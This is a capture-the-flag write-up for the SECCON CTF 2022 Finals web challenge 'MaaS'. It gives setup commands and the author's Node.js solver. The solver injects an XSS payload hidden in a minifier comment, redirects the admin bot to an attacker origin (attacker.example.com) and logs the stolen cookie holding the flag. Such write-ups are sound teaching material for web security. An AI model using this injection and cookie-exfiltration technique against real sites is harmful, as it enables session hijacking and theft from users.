---
title: "Maas - SECCON CTF 2022 Finals 2023"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "xss", "csrf", "web", "seccon-ctf-2022-finals"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202302_SECCON_CTF_2022_Finals/web/maas"
license: "none stated"
ctf:
  name: "SECCON CTF 2022 Finals"
  year: 2023
  challenge: "Maas"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202302_SECCON_CTF_2022_Finals/web/maas>
- **CTF:** SECCON CTF 2022 Finals 2023

---

# [web] MaaS

## Description

Minifier as a Service

- `http://maas.{int,dom}.seccon.games:3000`

## Attachments

- [maas](files/maas)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_BASE_URL=http://localhost:3000 \
    -e ATTACK_BASE_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solver)
```

where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202302_SECCON_CTF_2022_Finals/web/maas/solver/index.js>

```javascript
const fastify = require("fastify")();
const fs = require("node:fs").promises;

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL =
  process.env.SECCON_BASE_URL ?? fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL =
  process.env.ATTACK_BASE_URL ?? fail("No ATTACK_BASE_URL");
const LISTEN_PORT = process.env.PORT ?? "8080";

if (!ATTACK_BASE_URL.startsWith("http://")) {
  fail("Invalid ATTACK_BASE_URL: the CSRF will fail");
}

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const exploit = async () => {
  const xss = `<meta http-equiv="Refresh" content="0; URL=${ATTACK_BASE_URL}">`;
  const code = `/*!${"\n".repeat(xss.length + 3)}${xss}*/\n`;

  const res = await (
    await fetch(`${SECCON_BASE_URL}/report`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        code,
      }),
    })
  ).text();
  console.log(res); // "Received :)"
};

const start = async () => {
  fastify.get("/", async (req, reply) => {
    const html = await fs.readFile("index.html");
    return reply.type("text/html; charset=utf-8").send(html);
  });

  fastify.get("/print", async (req, reply) => {
    console.log(req.query.cookie); // Print a flag

    process.exit(0);
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) {
        fastify.log.error(err);
        process.exit(1);
      }

      await sleep(2 * 1000);
      await exploit();

      await sleep(10 * 1000);
      fail("Failed");
    }
  );
};
start();
```
